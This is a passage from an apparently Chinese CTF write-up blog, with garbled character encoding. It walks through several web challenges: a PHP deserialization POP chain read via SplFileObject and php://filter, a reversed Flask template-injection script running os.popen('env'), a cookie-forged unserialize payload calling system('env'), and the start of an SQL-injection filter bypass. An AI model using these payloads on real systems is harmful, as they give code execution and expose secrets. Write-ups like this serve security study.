class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// flag.php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">teacher</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$rank</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">private</span> <span class=\"variable\">$salary</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$rank</span>, <span class=\"variable\">$salary</span> = <span class=\"number\">10000</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;rank = <span class=\"variable\">$rank</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;salary = <span class=\"variable\">$salary</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">classroom</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$leader</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$leader</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;leader = <span class=\"variable\">$leader</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hahaha</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;name != <span class=\"string\">&#x27;one class&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable language_\">$this</span>-&gt;leader-&gt;name != <span class=\"string\">&#x27;ing&#x27;</span> <span class=\"keyword\">or</span> <span class=\"variable language_\">$this</span>-&gt;leader-&gt;rank != <span class=\"string\">&#x27;department&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">return</span> False;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">return</span> True;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">school</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$department</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$headmaster</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$department</span>, <span class=\"variable\">$ceo</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;department = <span class=\"variable\">$department</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;headmaster = <span class=\"variable\">$ceo</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">IPO</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;headmaster == <span class=\"string\">&#x27;ong&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Pretty Good ! Ctfer!\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"keyword\">new</span> <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;a&#x27;</span>](<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;b&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;department-&gt;<span class=\"title function_ invoke__\">hahaha</span>()) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">IPO</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;d&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;d&#x27;</span>]));</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">school</span>(<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">classroom</span>(<span class=\"string\">&#x27;one class&#x27;</span>,<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">teacher</span>(<span class=\"string\">&#x27;ing&#x27;</span>,<span class=\"string\">&#x27;department&#x27;</span>)),<span class=\"string\">&#x27;ong&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>é“¾å­å¾ˆå¥½æ‰¾ï¼Œä¸»è¦æ˜¯ <code> echo new $_POST['a']($_POST['b']);</code>  æ€ä¹ˆåˆ©ç”¨ï¼Ÿ<br>\na=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php</p>\n<h3 id=\"23hznuctf-2023-preliminaryflask\"><a class=\"markdownIt-Anchor\" href=\"#23hznuctf-2023-preliminaryflask\">#</a> 23.[HZNUCTF 2023 preliminary]flask</h3>\n<p>æ­¤é¢˜å°†è¾“å…¥çš„å†…å®¹å€’ç½®äº†</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;7*7&#125;&#125;ä¸è¡Œ,&#125;&#125;7*7&#123;&#123;å¯ä»¥</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">url=<span class=\"string\">&#x27;http://node2.anna.nssctf.cn:28463/?name=&#x27;</span>  </span><br><span class=\"line\"><span class=\"built_in\">str</span>=<span class=\"string\">&#x27;&#x27;&#x27;&#123;%print(lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;env&#x27;).read())%&#125;&#x27;&#x27;&#x27;</span>  </span><br><span class=\"line\">payload=<span class=\"built_in\">str</span>[::-<span class=\"number\">1</span>]  </span><br><span class=\"line\">url+=payload  </span><br><span class=\"line\">r=requests.get(url=url)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure>\n<p>ä»€ä¹ˆæ˜¯ env?</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">env æ˜¯ä¸€ä¸ªç”¨äºæ˜¾ç¤ºç³»ç»Ÿç¯å¢ƒå˜é‡çš„å‘½ä»¤è¡Œå·¥å…·ã€‚åœ¨ä¸å¸¦å‚æ•°çš„æƒ…å†µä¸‹ï¼Œå®ƒä¼šåˆ—å‡ºå½“å‰ shell ä¸­æ‰€æœ‰çš„ç¯å¢ƒå˜é‡ã€‚é€šè¿‡ä½¿ç”¨è¯¥å‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹æ“ä½œç³»ç»Ÿä¸­è®¾ç½®çš„ç¯å¢ƒå˜é‡ï¼Œä»¥åŠå¯¹å®ƒä»¬è¿›è¡Œå¢åŠ ã€ä¿®æ”¹ã€åˆ é™¤ç­‰æ“ä½œã€‚</span><br></pre></td></tr></table></figure>\n<h3 id=\"24hznuctf-2023-preliminaryppppop\"><a class=\"markdownIt-Anchor\" href=\"#24hznuctf-2023-preliminaryppppop\">#</a> 24.[HZNUCTF 2023 preliminary]ppppop</h3>\n<p>æ‰“å¼€ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼ŒæŠ“åŒ…çœ‹ä¸€ä¸‹ï¼Œå‘ç° cookie å¤„</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: user=Tzo0OiJVc2VyIjoxOntzOjc6ImlzQWRtaW4iO2I6MDt9</span><br><span class=\"line\"></span><br><span class=\"line\">base64è§£ç ä¹‹åæ˜¯:</span><br><span class=\"line\">O:4:&quot;User&quot;:1:&#123;s:7:&quot;isAdmin&quot;;b:0;&#125;</span><br><span class=\"line\">æŠŠb:0æ”¹æˆb:1ç„¶åbase64ç¼–ç æ”¹æˆæ–°çš„cookieå‘åŒ…,å°±èƒ½çœ‹è§å†…å®¹</span><br></pre></td></tr></table></figure>\n<p>php ä»£ç :</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;utils.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$className</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$funcName</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$args</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$class</span> = <span class=\"keyword\">new</span> <span class=\"variable language_\">$this</span>-&gt;className;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$funcName</span> = <span class=\"variable language_\">$this</span>-&gt;funcName;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$class</span>-&gt;<span class=\"variable\">$funcName</span>(<span class=\"variable language_\">$this</span>-&gt;args);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>, <span class=\"variable\">$arg</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$func</span>(<span class=\"variable\">$arg</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">checkUser</span>()) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"variable\">$payload</span> = <span class=\"title function_ invoke__\">strrev</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;payload&#x27;</span>]));</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$payload</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;utils.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$className</span>=<span class=\"string\">&quot;B&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$funcName</span>=<span class=\"string\">&#x27;system&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$args</span>=<span class=\"string\">&#x27;env&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$class</span> = <span class=\"keyword\">new</span> <span class=\"variable language_\">$this</span>-&gt;className;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$funcName</span> = <span class=\"variable language_\">$this</span>-&gt;funcName;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$class</span>-&gt;<span class=\"variable\">$funcName</span>(<span class=\"variable language_\">$this</span>-&gt;args);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>, <span class=\"variable\">$arg</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable\">$func</span>(<span class=\"variable\">$arg</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">A</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">strrev</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>)));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\">/*postä¼ :</span></span><br><span class=\"line\"><span class=\"comment\">payload=fTsidm5lIjozOnM7InNncmEiOjQ6czsibWV0c3lzIjo2OnM7ImVtYU5jbnVmIjo4OnM7IkIiOjE6czsiZW1hTnNzYWxjIjo5OnN7OjM6IkEiOjE6Tw==*/</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"25hdctf-2023loginmaster\"><a class=\"markdownIt-Anchor\" href=\"#25hdctf-2023loginmaster\">#</a> 25.[HDCTF 2023]LoginMaster</h3>\n<p>é€šè¿‡ dirsearch æ‰«åˆ° robots.txt, æ‰“å¼€å‘ç°è¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function checkSql($s) </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i&quot;,$s))&#123;</span><br><span class=\"line\">        alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class=\"line\">        die($FLAG);</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">    alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br></pre></td></tr></table></figure>\n<p><code>Quine</code>  åˆå«åšè‡ªäº§ç”Ÿç¨‹åºï¼Œåœ¨ <code>sql</code>  æ³¨å…¥æŠ€æœ¯ä¸­ï¼Œè¿™æ˜¯ä¸€ç§ä½¿å¾—è¾“å…¥çš„ <code>sql</code>  è¯­å¥å’Œè¾“å‡ºçš„ <code>sql</code>  è¯­å¥ä¸€è‡´çš„æŠ€æœ¯ï¼Œå¸¸ç”¨äºä¸€äº›ç‰¹æ®Šçš„ç™»é™†ç»•è¿‡ <code>sql</code>  